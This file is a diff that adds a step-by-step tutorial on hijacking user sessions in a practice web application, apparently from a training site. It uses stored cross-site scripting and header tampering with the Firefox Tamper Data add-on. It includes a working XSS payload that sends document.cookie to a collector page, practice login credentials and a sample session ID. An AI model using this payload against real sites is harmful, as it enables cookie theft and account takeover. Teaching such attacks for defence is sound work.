@@ -1,0 +1,103 @@
+How to Hack a Website
+In this website hacking practical scenario, we are going to hijack the user session of the web application located at www.techpanda.org. We will use cross site scripting to read the cookie session id then use it to impersonate a legitimate user session.
+
+The assumption made is that the attacker has access to the web application and he would like to hijack the sessions of other users that use the same application. The goal of this attack could be to gain admin access to the web application assuming the attacker’s access account is a limited one.
+
+Step 1) Open URL http://www.techpanda.org/.
+
+For practice purposes, it is strongly recommended to gain access using SQL Injection. Refer to this article for more information on how to do that.
+
+Step 2) Enter Login Details.
+
+The login email is admin@google.com, the password is Password2010.
+
+Step 3) Check dashboard.
+
+If you have logged in successfully, then you will get the following dashboard
+
+How to hack a Website
+
+Step 4) Enter New Content.
+
+Click on Add New Contact and Enter the following as the first name
+
+<a href=# onclick=\”document.location=\’http://techpanda.org/snatch_sess_id.php?c=\’+escape\(document.cookie\)\;\”>Dark</a>
+
+Step 5) Add Javascript.
+
+The above code uses JavaScript. It adds a hyperlink with an onclick event. When the unsuspecting user clicks the link, the event retrieves the PHP cookie session ID and sends it to the snatch_sess_id.php page together with the session id in the URL
+
+How to hack a Website
+
+Step 6) Add Details.
+
+Enter the remaining details as shown below and Click on Save Changes
+
+How to hack a Website
+
+Step 7) Check dashboard.
+
+Your dashboard will now look like the following screen
+
+How to hack a Website
+
+Step 8) Check session id.
+
+Since the cross site script code is stored in the database, it will be loaded everytime the users with access rights login
+Let’s suppose the administrator logins and clicks on the hyperlink that says Dark
+He/she will get the window with the session id showing in the URL
+How to hack a Website
+
+Note: the script could be sending the value to some remote server where the PHPSESSID is stored then the user redirected back to the website as if nothing happened.
+
+Note: the value you get may be different from the one in this webpage hacking tutorial, but the concept is the same
+
+Session Impersonation using Firefox and Tamper Data add-on
+The flowchart below shows the steps that you must take to complete this exercise.
+
+How to hack a Website
+
+You will need Firefox web browser for this section and Tamper Data add-on
+Open Firefox and install the add as shown in the diagrams below
+How to hack a Website
+
+How to hack a Website
+
+Search for tamper data then click on install as shown above
+How to hack a Website
+
+Click on Accept and Install…
+How to hack a Website
+
+How to hack a Website
+
+Click on Restart now when the installation completes
+Enable the menu bar in Firefox if it is not shown
+How to hack a Website
+
+Click on tools menu then select Tamper Data as shown below
+How to hack a Website
+
+You will get the following Window. Note: If the Windows is not empty, hit the clear button
+How to hack a Website
+
+Click on Start Tamper menu
+Switch back to Firefox web browser, type http://www.techpanda.org/dashboard.php then press the enter key to load the page
+You will get the following pop up from Tamper Data
+How to hack a Website
+
+The pop-up window has three (3) options. The Tamper option allows you to modify the HTTP header information before it is submitted to the server.
+Click on it
+You will get the following window
+How to hack a Website
+
+Copy the PHP session ID you copied from the attack URL and paste it after the equal sign. Your value should now look like this
+PHPSESSID=2DVLTIPP2N8LDBN11B2RA76LM2
+
+Click on OK button
+You will get the Tamper data popup window again
+How to hack a Website
+
+Uncheck the checkbox that asks Continue Tampering?
+Click on submit button when done
+You should be able to see the dashboard as shown below
